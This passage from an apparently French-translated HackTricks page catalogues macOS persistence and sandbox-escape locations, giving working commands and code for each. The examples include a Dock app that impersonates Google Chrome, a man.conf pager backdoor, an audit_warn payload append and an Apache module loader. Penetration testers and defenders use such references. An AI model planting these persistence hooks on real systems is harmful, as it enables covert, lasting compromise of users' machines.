app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
{% endcode %}

Compilez-le avec: `osacompile -l JavaScript -o folder.scpt source.js`

Déplacez-le vers:
```bash
mkdir -p "$HOME/Library/Scripts/Folder Action Scripts"
mv /tmp/folder.scpt "$HOME/Library/Scripts/Folder Action Scripts"
```
Ensuite, ouvrez l'application `Folder Actions Setup`, sélectionnez le **dossier que vous souhaitez surveiller** et sélectionnez dans votre cas **`folder.scpt`** (dans mon cas, je l'ai appelé output2.scp):

<figure><img src="../.gitbook/assets/image (2) (1) (1).png" alt="" width="297"><figcaption></figcaption></figure>

Maintenant, si vous ouvrez ce dossier avec **Finder**, votre script sera exécuté.

Cette configuration a été stockée dans le **plist** situé dans **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** au format base64.

Maintenant, essayons de préparer cette persistance sans accès GUI:

1. **Copiez `~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** vers `/tmp` pour le sauvegarder:
* `cp ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist /tmp`
2. **Supprimez** les Folder Actions que vous venez de définir:

<figure><img src="../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

Maintenant que nous avons un environnement vide

3. Copiez le fichier de sauvegarde: `cp /tmp/com.apple.FolderActionsDispatcher.plist ~/Library/Preferences/`
4. Ouvrez l'application Folder Actions Setup pour consommer cette configuration: `open "/System/Library/CoreServices/Applications/Folder Actions Setup.app/"`

{% hint style="danger" %}
Et cela n'a pas fonctionné pour moi, mais ce sont les instructions de l'article :(
{% endhint %}

### Spotlight Importers

Writeup: [https://theevilbit.github.io/beyond/beyond\_0011/](https://theevilbit.github.io/beyond/beyond\_0011/)

* Utile pour contourner le sandbox: [🟠](https://emojipedia.org/large-orange-circle)
* Mais vous vous retrouverez dans un nouveau

#### Emplacement

* **`/Library/Spotlight`**&#x20;
* **`~/Library/Spotlight`**

#### Description

Vous vous retrouverez dans un **sandbox lourd**, donc vous ne voudrez probablement pas utiliser cette technique.

### Raccourcis Dock

Writeup: [https://theevilbit.github.io/beyond/beyond\_0027/](https://theevilbit.github.io/beyond/beyond\_0027/)

* Utile pour contourner le sandbox: [✅](https://emojipedia.org/check-mark-button)
* Mais vous devez avoir installé une application malveillante dans le système

#### Emplacement

* `~/Library/Preferences/com.apple.dock.plist`
* **Déclencheur**: Lorsque l'utilisateur clique sur l'application dans le dock

#### Description et exploitation

Toutes les applications qui apparaissent dans le Dock sont spécifiées dans le plist: **`~/Library/Preferences/com.apple.dock.plist`**

Il est possible d'**ajouter une application** simplement avec:

{% code overflow="wrap" %}
```bash
# Add /System/Applications/Books.app
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/System/Applications/Books.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'

# Restart Dock
killall Dock
```
{% endcode %}

En utilisant de l'**ingénierie sociale**, vous pourriez **vous faire passer par exemple pour Google Chrome** dans le dock et exécuter réellement votre propre script :
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
echo '#!/bin/sh
open /Applications/Google\ Chrome.app/ &
touch /tmp/ImGoogleChrome' > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << EOF > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
killall Dock
```
### Sélecteurs de couleurs

Writeup: [https://theevilbit.github.io/beyond/beyond\_0017](https://theevilbit.github.io/beyond/beyond\_0017/)

* Utile pour contourner le sandbox: [🟠](https://emojipedia.org/large-orange-circle)
* Une action très spécifique doit se produire
* Vous vous retrouverez dans un autre sandbox

#### Emplacement

* `/Library/ColorPickers`&#x20;
* Nécessite les droits d'administrateur
* Déclencheur : Utilisation du sélecteur de couleurs
* `~/Library/ColorPickers`
* Déclencheur : Utilisation du sélecteur de couleurs

#### Description et Exploitation

**Compilez un bundle** de sélecteur de couleurs avec votre code (vous pouvez utiliser [**celui-ci par exemple**](https://github.com/viktorstrate/color-picker-plus)) et ajoutez un constructeur (comme dans la section [Économiseur d'écran](macos-auto-start-locations.md#screen-saver)) et copiez le bundle dans `~/Library/ColorPickers`.

Ensuite, lorsque le sélecteur de couleurs est déclenché, votre code devrait également être exécuté.

Notez que le binaire chargé avec votre bibliothèque a un **sandbox très restrictif** : `/System/Library/Frameworks/AppKit.framework/Versions/C/XPCServices/LegacyExternalColorPickerService-x86_64.xpc/Contents/MacOS/LegacyExternalColorPickerService-x86_64`

{% code overflow="wrap" %}
```bash
[Key] com.apple.security.temporary-exception.sbpl
[Value]
[Array]
[String] (deny file-write* (home-subpath "/Library/Colors"))
[String] (allow file-read* process-exec file-map-executable (home-subpath "/Library/ColorPickers"))
[String] (allow file-read* (extension "com.apple.app-sandbox.read"))
```
{% endcode %}

### Plugins de synchronisation Finder

**Article**: [https://theevilbit.github.io/beyond/beyond\_0026/](https://theevilbit.github.io/beyond/beyond\_0026/)\
**Article**: [https://objective-see.org/blog/blog\_0x11.html](https://objective-see.org/blog/blog\_0x11.html)

* Utile pour contourner le sandbox : **Non, car vous devez exécuter votre propre application**

#### Emplacement

* Une application spécifique

#### Description et Exploit

Un exemple d'application avec une extension de synchronisation Finder [**peut être trouvé ici**](https://github.com/D00MFist/InSync).

Les applications peuvent avoir des `Extensions de synchronisation Finder`. Cette extension sera intégrée dans une application qui sera exécutée. De plus, pour que l'extension puisse exécuter son code, elle **doit être signée** avec un certificat de développeur Apple valide, elle doit être **sandboxée** (bien que des exceptions relaxées puissent être ajoutées) et elle doit être enregistrée avec quelque chose comme :
```bash
pluginkit -a /Applications/FindIt.app/Contents/PlugIns/FindItSync.appex
pluginkit -e use -i com.example.InSync.InSync
```
### Économiseur d'écran

Writeup: [https://theevilbit.github.io/beyond/beyond\_0016/](https://theevilbit.github.io/beyond/beyond\_0016/)\
Writeup: [https://posts.specterops.io/saving-your-access-d562bf5bf90b](https://posts.specterops.io/saving-your-access-d562bf5bf90b)

* Utile pour contourner le bac à sable : [🟠](https://emojipedia.org/large-orange-circle)
* Mais vous finirez dans un bac à sable d'application commun

#### Emplacement

* `/System/Library/Screen Savers`&#x20;
* Nécessite les droits d'administrateur
* **Déclencheur** : Sélectionnez l'économiseur d'écran
* `/Library/Screen Savers`
* Nécessite les droits d'administrateur
* **Déclencheur** : Sélectionnez l'économiseur d'écran
* `~/Library/Screen Savers`
* **Déclencheur** : Sélectionnez l'économiseur d'écran

<figure><img src="../.gitbook/assets/image (1) (1) (1) (1).png" alt="" width="375"><figcaption></figcaption></figure>

#### Description & Exploit

Créez un nouveau projet dans Xcode et sélectionnez le modèle pour générer un nouvel **économiseur d'écran**. Ensuite, ajoutez-y votre code, par exemple le code suivant pour générer des journaux.

**Compilez** le projet et copiez le bundle `.saver` dans **`~/Library/Screen Savers`**. Ensuite, ouvrez l'interface graphique de l'économiseur d'écran et si vous cliquez simplement dessus, cela devrait générer beaucoup de journaux :

{% code overflow="wrap" %}
```bash
sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "hello_screensaver"'

Timestamp                       (process)[PID]
2023-09-27 22:55:39.622369+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver void custom(int, const char **)
2023-09-27 22:55:39.622623+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView initWithFrame:isPreview:]
2023-09-27 22:55:39.622704+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView hasConfigureSheet]
```
{% endcode %}

{% hint style="danger" %}
Notez que parce que à l'intérieur des autorisations du binaire qui charge ce code (`/System/Library/Frameworks/ScreenSaver.framework/PlugIns/legacyScreenSaver.appex/Contents/MacOS/legacyScreenSaver`), vous pouvez trouver **`com.apple.security.app-sandbox`**, vous serez **à l'intérieur du bac à sable de l'application commune**.
{% endhint %}

Code du Screen Saver :
```objectivec
//
//  ScreenSaverExampleView.m
//  ScreenSaverExample
//
//  Created by Carlos Polop on 27/9/23.
//

#import "ScreenSaverExampleView.h"

@implementation ScreenSaverExampleView

- (instancetype)initWithFrame:(NSRect)frame isPreview:(BOOL)isPreview
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
self = [super initWithFrame:frame isPreview:isPreview];
if (self) {
[self setAnimationTimeInterval:1/30.0];
}
return self;
}

- (void)startAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super startAnimation];
}

- (void)stopAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super stopAnimation];
}

- (void)drawRect:(NSRect)rect
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super drawRect:rect];
}

- (void)animateOneFrame
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return;
}

- (BOOL)hasConfigureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return NO;
}

- (NSWindow*)configureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return nil;
}

__attribute__((constructor))
void custom(int argc, const char **argv) {
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
}

@end
```
### Plugins Spotlight

Utiles pour contourner le sandbox : [🟠](https://emojipedia.org/large-orange-circle)

* Mais vous finirez dans un sandbox d'application

#### Emplacement

* `~/Library/Spotlight/`
* **Déclencheur** : Un nouveau fichier avec une extension gérée par le plugin Spotlight est créé.
* `/Library/Spotlight/`
* **Déclencheur** : Un nouveau fichier avec une extension gérée par le plugin Spotlight est créé.
* Nécessite les droits d'administrateur
* `/System/Library/Spotlight/`
* **Déclencheur** : Un nouveau fichier avec une extension gérée par le plugin Spotlight est créé.
* Nécessite les droits d'administrateur
* `Some.app/Contents/Library/Spotlight/`
* **Déclencheur** : Un nouveau fichier avec une extension gérée par le plugin Spotlight est créé.
* Nécessite une nouvelle application

#### Description et exploitation

Spotlight est la fonctionnalité de recherche intégrée à macOS, conçue pour offrir aux utilisateurs un accès rapide et complet aux données de leur ordinateur.\
Pour faciliter cette capacité de recherche rapide, Spotlight maintient une **base de données propriétaire** et crée un index en **analysant la plupart des fichiers**, permettant des recherches rapides à la fois dans les noms de fichiers et leur contenu.

Le mécanisme sous-jacent de Spotlight implique un processus central appelé 'mds', qui signifie **'metadata server'**. Ce processus orchestre l'ensemble du service Spotlight. En complément, il existe plusieurs démons 'mdworker' qui effectuent diverses tâches de maintenance, telles que l'indexation de différents types de fichiers (`ps -ef | grep mdworker`). Ces tâches sont rendues possibles grâce aux plugins d'importation Spotlight, ou **"bundles .mdimporter"**, qui permettent à Spotlight de comprendre et d'indexer le contenu d'une large gamme de formats de fichiers.

Les plugins ou bundles **`.mdimporter`** sont situés aux emplacements mentionnés précédemment et si un nouveau bundle apparaît, il est chargé en quelques minutes (aucun redémarrage de service n'est nécessaire). Ces bundles doivent indiquer les **types de fichiers et les extensions qu'ils peuvent gérer**, de cette manière, Spotlight les utilisera lorsqu'un nouveau fichier avec l'extension indiquée sera créé.

Il est possible de **trouver tous les `mdimporters`** chargés en exécutant :
```bash
mdimport -L
Paths: id(501) (
"/System/Library/Spotlight/iWork.mdimporter",
"/System/Library/Spotlight/iPhoto.mdimporter",
"/System/Library/Spotlight/PDF.mdimporter",
[...]
```
Et par exemple, **/Library/Spotlight/iBooksAuthor.mdimporter** est utilisé pour analyser ce type de fichiers (extensions `.iba` et `.book`, entre autres) :
```json
plutil -p /Library/Spotlight/iBooksAuthor.mdimporter/Contents/Info.plist

[...]
"CFBundleDocumentTypes" => [
0 => {
"CFBundleTypeName" => "iBooks Author Book"
"CFBundleTypeRole" => "MDImporter"
"LSItemContentTypes" => [
0 => "com.apple.ibooksauthor.book"
1 => "com.apple.ibooksauthor.pkgbook"
2 => "com.apple.ibooksauthor.template"
3 => "com.apple.ibooksauthor.pkgtemplate"
]
"LSTypeIsPackage" => 0
}
]
[...]
=> {
"UTTypeConformsTo" => [
0 => "public.data"
1 => "public.composite-content"
]
"UTTypeDescription" => "iBooks Author Book"
"UTTypeIdentifier" => "com.apple.ibooksauthor.book"
"UTTypeReferenceURL" => "http://www.apple.com/ibooksauthor"
"UTTypeTagSpecification" => {
"public.filename-extension" => [
0 => "iba"
1 => "book"
]
}
}
[...]
```
{% hint style="danger" %}
Si vous vérifiez le Plist d'autres `mdimporter`, vous ne trouverez peut-être pas l'entrée **`UTTypeConformsTo`**. C'est parce que c'est un _Uniform Type Identifiers_ ([UTI](https://en.wikipedia.org/wiki/Uniform\_Type_Identifier)) intégré et il n'a pas besoin de spécifier les extensions.

De plus, les plugins par défaut du système ont toujours la priorité, donc un attaquant ne peut accéder qu'aux fichiers qui ne sont pas indexés par les `mdimporters` d'Apple.
{% endhint %}

Pour créer votre propre importateur, vous pouvez commencer par ce projet : [https://github.com/megrimm/pd-spotlight-importer](https://github.com/megrimm/pd-spotlight-importer) puis changer le nom, les **`CFBundleDocumentTypes`** et ajouter **`UTImportedTypeDeclarations`** pour prendre en charge l'extension que vous souhaitez supporter et les refléter dans **`schema.xml`**.\
Ensuite, **modifiez** le code de la fonction **`GetMetadataForFile`** pour exécuter votre charge utile lorsqu'un fichier avec l'extension traitée est créé.

Enfin, **construisez et copiez votre nouveau `.mdimporter`** dans l'un des emplacements précédents et vous pouvez vérifier s'il est chargé en **surveillant les journaux** ou en vérifiant **`mdimport -L.`**

### ~~Panneau de préférences~~

{% hint style="danger" %}
Il semble que cela ne fonctionne plus.
{% endhint %}

Rédaction : [https://theevilbit.github.io/beyond/beyond\_0009/](https://theevilbit.github.io/beyond/beyond\_0009/)

* Utile pour contourner le sandbox : [🟠](https://emojipedia.org/large-orange-circle)
* Cela nécessite une action utilisateur spécifique

#### Emplacement

* **`/System/Library/PreferencePanes`**
* **`/Library/PreferencePanes`**
* **`~/Library/PreferencePanes`**

#### Description

Il semble que cela ne fonctionne plus.

## Contournement du sandbox root

{% hint style="success" %}
Ici, vous pouvez trouver des emplacements de démarrage utiles pour contourner le sandbox qui vous permettent simplement d'exécuter quelque chose en l'écrivant dans un fichier en tant que root et/ou en nécessitant d'autres conditions étranges.
{% endhint %}

### Périodique

Rédaction : [https://theevilbit.github.io/beyond/beyond\_0019/](https://theevilbit.github.io/beyond/beyond\_0019/)

* Utile pour contourner le sandbox : [🟠](https://emojipedia.org/large-orange-circle)
* Mais vous devez être root

#### Emplacement

* `/etc/periodic/daily`, `/etc/periodic/weekly`, `/etc/periodic/monthly`, `/usr/local/etc/periodic`
* Nécessite d'être root
* **Déclencheur** : Lorsque le moment arrive
* `/etc/daily.local`, `/etc/weekly.local` ou `/etc/monthly.local`
* Nécessite d'être root
* **Déclencheur** : Lorsque le moment arrive

#### Description et exploitation

Les scripts périodiques (**`/etc/periodic`**) sont exécutés en raison des **daemons de lancement** configurés dans `/System/Library/LaunchDaemons/com.apple.periodic*`. Notez que les scripts stockés dans `/etc/periodic/` sont **exécutés** en tant que **propriétaire du fichier**, donc cela ne fonctionnera pas pour une éventuelle élévation de privilèges.

{% code overflow="wrap" %}
```bash
# Launch daemons that will execute the periodic scripts
ls -l /System/Library/LaunchDaemons/com.apple.periodic*
-rw-r--r--  1 root  wheel  887 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-daily.plist
-rw-r--r--  1 root  wheel  895 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-monthly.plist
-rw-r--r--  1 root  wheel  891 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-weekly.plist

# The scripts located in their locations
ls -lR /etc/periodic
total 0
drwxr-xr-x  11 root  wheel  352 May 13 00:29 daily
drwxr-xr-x   5 root  wheel  160 May 13 00:29 monthly
drwxr-xr-x   3 root  wheel   96 May 13 00:29 weekly

/etc/periodic/daily:
total 72
-rwxr-xr-x  1 root  wheel  1642 May 13 00:29 110.clean-tmps
-rwxr-xr-x  1 root  wheel   695 May 13 00:29 130.clean-msgs
[...]

/etc/periodic/monthly:
total 24
-rwxr-xr-x  1 root  wheel   888 May 13 00:29 199.rotate-fax
-rwxr-xr-x  1 root  wheel  1010 May 13 00:29 200.accounting
-rwxr-xr-x  1 root  wheel   606 May 13 00:29 999.local

/etc/periodic/weekly:
total 8
-rwxr-xr-x  1 root  wheel  620 May 13 00:29 999.local
```
{% endcode %}

Il existe d'autres scripts périodiques qui seront exécutés indiqués dans **`/etc/defaults/periodic.conf`**:
```bash
grep "Local scripts" /etc/defaults/periodic.conf
daily_local="/etc/daily.local"				# Local scripts
weekly_local="/etc/weekly.local"			# Local scripts
monthly_local="/etc/monthly.local"			# Local scripts
```
Si vous parvenez à écrire l'un des fichiers `/etc/daily.local`, `/etc/weekly.local` ou `/etc/monthly.local`, il sera **exécuté tôt ou tard**.

### PAM

Writeup: [Linux Hacktricks PAM](../linux-hardening/linux-post-exploitation/pam-pluggable-authentication-modules.md)\
Writeup: [https://theevilbit.github.io/beyond/beyond\_0005/](https://theevilbit.github.io/beyond/beyond\_0005/)

* Utile pour contourner le sandbox : [🟠](https://emojipedia.org/large-orange-circle)
* Mais vous devez être root

#### Emplacement

* Toujours nécessite les droits root

#### Description et exploitation

Comme PAM est plus axé sur la **persistance** et les logiciels malveillants que sur l'exécution facile à l'intérieur de macOS, ce blog ne donnera pas d'explication détaillée, **lisez les writeups pour mieux comprendre cette technique**.

### Plugins d'autorisation

Writeup: [https://theevilbit.github.io/beyond/beyond\_0028/](https://theevilbit.github.io/beyond/beyond\_0028/)\
Writeup: [https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)

* Utile pour contourner le sandbox : [🟠](https://emojipedia.org/large-orange-circle)
* Mais vous devez être root et effectuer des configurations supplémentaires

#### Emplacement

* `/Library/Security/SecurityAgentPlugins/`
* Nécessite les droits root
* Il est également nécessaire de configurer la base de données d'autorisation pour utiliser le plugin

#### Description et exploitation

Vous pouvez créer un plugin d'autorisation qui sera exécuté lorsque l'utilisateur se connecte pour maintenir la persistance. Pour plus d'informations sur la création de ces plugins, consultez les writeups précédents (et faites attention, un plugin mal écrit peut vous bloquer et vous devrez nettoyer votre Mac en mode de récupération).

### Man.conf

Writeup: [https://theevilbit.github.io/beyond/beyond\_0030/](https://theevilbit.github.io/beyond/beyond\_0030/)

* Utile pour contourner le sandbox : [🟠](https://emojipedia.org/large-orange-circle)
* Mais vous devez être root et l'utilisateur doit utiliser man

#### Emplacement

* **`/private/etc/man.conf`**
* Nécessite les droits root
* **`/private/etc/man.conf`** : Chaque fois que man est utilisé

#### Description et exploitation

Le fichier de configuration **`/private/etc/man.conf`** indique le binaire/script à utiliser lors de l'ouverture des fichiers de documentation man. Ainsi, le chemin vers l'exécutable peut être modifié de sorte que chaque fois que l'utilisateur utilise man pour lire des documents, une porte dérobée est exécutée.

Par exemple, définissez dans **`/private/etc/man.conf`**:
```
MANPAGER /tmp/view
```
Et ensuite, créez `/tmp/view` comme suit :
```bash
#!/bin/zsh

touch /tmp/manconf

/usr/bin/less -s
```
### Apache2

**Writeup**: [https://theevilbit.github.io/beyond/beyond\_0023/](https://theevilbit.github.io/beyond/beyond\_0023/)

* Utile pour contourner le sandbox: [🟠](https://emojipedia.org/large-orange-circle)
* Mais vous devez être root et Apache doit être en cours d'exécution

#### Emplacement

* **`/etc/apache2/httpd.conf`**
* Nécessite les droits root
* Déclencheur: lorsque Apache2 démarre

#### Description et Exploit

Vous pouvez indiquer dans /etc/apache2/httpd.conf de charger un module en ajoutant une ligne telle que:

{% code overflow="wrap" %}
```bash
LoadModule my_custom_module /Users/Shared/example.dylib "My Signature Authority"
```
{% endcode %}

De cette façon, vos modules compilés seront chargés par Apache. La seule chose est que vous devez soit **le signer avec un certificat Apple valide**, soit vous devez **ajouter un nouveau certificat de confiance** dans le système et **le signer** avec celui-ci.

Ensuite, si nécessaire, pour vous assurer que le serveur sera démarré, vous pouvez exécuter :
```bash
sudo launchctl load -w /System/Library/LaunchDaemons/org.apache.httpd.plist
```
Exemple de code pour le Dylb :
```objectivec
#include <stdio.h>
#include <syslog.h>

__attribute__((constructor))
static void myconstructor(int argc, const char **argv)
{
printf("[+] dylib constructor called from %s\n", argv[0]);
syslog(LOG_ERR, "[+] dylib constructor called from %s\n", argv[0]);
}
```
### Cadre d'audit BSM

Rédaction : [https://theevilbit.github.io/beyond/beyond\_0031/](https://theevilbit.github.io/beyond/beyond\_0031/)

* Utile pour contourner le sandbox : [🟠](https://emojipedia.org/large-orange-circle)
* Mais vous devez être root, auditd doit être en cours d'exécution et provoquer un avertissement

#### Emplacement

* **`/etc/security/audit_warn`**
* Nécessite les droits root
* **Déclencheur** : Lorsque auditd détecte un avertissement

#### Description et Exploit

Chaque fois que auditd détecte un avertissement, le script **`/etc/security/audit_warn`** est **exécuté**. Vous pouvez donc y ajouter votre charge utile.
```bash
echo "touch /tmp/auditd_warn" >> /etc/security/audit_warn
```
Vous pouvez forcer un avertissement avec `sudo audit -n`.

### Éléments de démarrage

{% hint style="danger" %}
**Ceci est obsolète, donc rien ne devrait être trouvé dans les répertoires suivants.**
{% endhint %}

Un **StartupItem** est un **répertoire** qui est **placé** dans l'un de ces deux dossiers : `/Library/StartupItems/` ou `/System/Library/StartupItems/`

Après avoir placé un nouveau répertoire dans l'un de ces deux emplacements, **deux autres éléments** doivent être placés à l'intérieur de ce répertoire. Ces deux éléments sont un **script rc** et un **plist** qui contient quelques paramètres. Ce plist doit être appelé "**StartupParameters.plist**".

{% tabs %}
{% tab title="StartupParameters.plist" %}
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Description</key>
<string>This is a description of this service</string>
<key>OrderPreference</key>
<string>None</string> <!--Other req services to execute before this -->
<key>Provides</key>
<array>
<string>superservicename</string> <!--Name of the services provided by this file -->
</array>
</dict>
</plist>
```
{% tab title="superservicename" %}
```bash
#!/bin/sh
. /etc/rc.common

StartService(){
touch /tmp/superservicestarted
}

StopService(){
rm /tmp/superservicestarted
}

RestartService(){
echo "Restarting"
}

RunService "$1"
```
{% endtab %}
{% endtabs %}

### emond

{% hint style="danger" %}
Je ne peux pas trouver ce composant dans mon macOS, donc pour plus d'informations, consultez le rapport
{% endhint %}

Rapport : [https://theevilbit.github.io/beyond/beyond\_0023/](https://theevilbit.github.io/beyond/beyond\_0023/)

Apple a introduit un mécanisme de journalisation appelé **emond**. Il semble qu'il n'ait jamais été entièrement développé et que le développement ait peut-être été **abandonné** par Apple au profit d'autres mécanismes, mais il reste **disponible**.

Ce service peu connu peut **ne pas être très utile pour un administrateur Mac**, mais pour un acteur malveillant, une très bonne raison serait de l'utiliser comme un **mécanisme de persistance que la plupart des administrateurs macOS ne connaîtraient probablement pas**. Détecter une utilisation malveillante d'emond ne devrait pas être difficile, car le LaunchDaemon système du service recherche des scripts à exécuter uniquement à un seul endroit :
```bash
ls -l /private/var/db/emondClients
```
### ~~XQuartz~~

Writeup: [https://theevilbit.github.io/beyond/beyond\_0018/](https://theevilbit.github.io/beyond/beyond\_0018/)

#### Emplacement

* **`/opt/X11/etc/X11/xinit/privileged_startx.d`**
* Nécessite les droits root
* **Déclencheur**: Avec XQuartz

#### Description & Exploit

XQuartz n'est **plus installé dans macOS**, donc si vous voulez plus d'informations, consultez le writeup.

### ~~kext~~

{% hint style="danger" %}
Il est si compliqué d'installer un kext même en tant que root que je ne le considérerai pas comme une échappatoire aux sandbox ou même pour la persistance (à moins que vous ayez une exploit)
{% endhint %}

#### Emplacement

Pour installer un KEXT en tant qu'élément de démarrage, il doit être **installé dans l'un des emplacements suivants**:

* `/System/Library/Extensions`
* Fichiers KEXT intégrés au système d'exploitation OS X.
* `/Library/Extensions`
* Fichiers KEXT installés par des logiciels tiers

Vous pouvez lister les fichiers kext actuellement chargés avec:
```bash
kextstat #List loaded kext
kextload /path/to/kext.kext #Load a new one based on path
kextload -b com.apple.driver.ExampleBundle #Load a new one based on path
kextunload /path/to/kext.kext
kextunload -b com.apple.driver.ExampleBundle
```
Pour plus d'informations sur les [**extensions de noyau, consultez cette section**](macos-security-and-privilege-escalation/mac-os-architecture#i-o-kit-drivers).

### ~~amstoold~~

Rédaction : [https://theevilbit.github.io/beyond/beyond\_0029/](https://theevilbit.github.io/beyond/beyond\_0029/)

#### Emplacement

* **`/usr/local/bin/amstoold`**
* Nécessite les droits root

#### Description et exploitation

Apparemment, le fichier `plist` de `/System/Library/LaunchAgents/com.apple.amstoold.plist` utilisait ce binaire tout en exposant un service XPC... le problème est que le binaire n'existait pas, donc vous pouviez y placer quelque chose et lorsque le service XPC était appelé, votre binaire était appelé.

Je ne peux plus trouver cela dans mon macOS.

### ~~xsanctl~~

Rédaction : [https://theevilbit.github.io/beyond/beyond\_0015/](https://theevilbit.github.io/beyond/beyond\_0015/)

#### Emplacement

* **`/Library/Preferences/Xsan/.xsanrc`**
* Nécessite les droits root
* **Déclencheur** : Lorsque le service est exécuté (rarement)

#### Description et exploitation

Apparemment, il n'est pas très courant d'exécuter ce script et je ne l'ai même pas trouvé dans mon macOS, donc si vous voulez plus d'informations, consultez la rédaction.

### ~~/etc/rc.common~~

{% hint style="danger" %}
**Cela ne fonctionne pas dans les versions récentes de MacOS**
{% endhint %}

Il est également possible de placer ici **des commandes qui seront exécutées au démarrage.** Exemple de script rc.common régulier :
```bash
#
# Common setup for startup scripts.
#
# Copyright 1998-2002 Apple Computer, Inc.
#

######################
# Configure the shell #
######################

#
# Be strict
#
#set -e
set -u

#
# Set command search path
#
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/libexec:/System/Library/CoreServices; export PATH

#
# Set the terminal mode
#
#if [ -x /usr/bin/tset ] && [ -f /usr/share/misc/termcap ]; then
#    TERM=$(tset - -Q); export TERM
#fi

###################
# Useful functions #
###################

#
# Determine if the network is up by looking for any non-loopback
# internet network interfaces.
#
CheckForNetwork()
{
local test

if [ -z "${NETWORKUP:=}" ]; then
test=$(ifconfig -a inet 2>/dev/null | sed -n -e '/127.0.0.1/d' -e '/0.0.0.0/d' -e '/inet/p' | wc -l)
if [ "${test}" -gt 0 ]; then
NETWORKUP="-YES-"
else
NETWORKUP="-NO-"
fi
fi
}

alias ConsoleMessage=echo

#
# Process management
#
GetPID ()
{
local program="$1"
local pidfile="${PIDFILE:=/var/run/${program}.pid}"
local     pid=""

if [ -f "${pidfile}" ]; then
pid=$(head -1 "${pidfile}")
if ! kill -0 "${pid}" 2> /dev/null; then
echo "Bad pid file $pidfile; deleting."
pid=""
rm -f "${pidfile}"
fi
fi

if [ -n "${pid}" ]; then
echo "${pid}"
return 0
else
return 1
fi
}

#
# Generic action handler
#
RunService ()
{
case $1 in
start  ) StartService   ;;
stop   ) StopService    ;;
restart) RestartService ;;
*      ) echo "$0: unknown argument: $1";;
esac
}
```
## Techniques et outils de persistance

* [https://github.com/cedowens/Persistent-Swift](https://github.com/cedowens/Persistent-Swift)
* [https://github.com/D00MFist/PersistentJXA](https://github.com/D00MFist/PersistentJXA)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? Ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
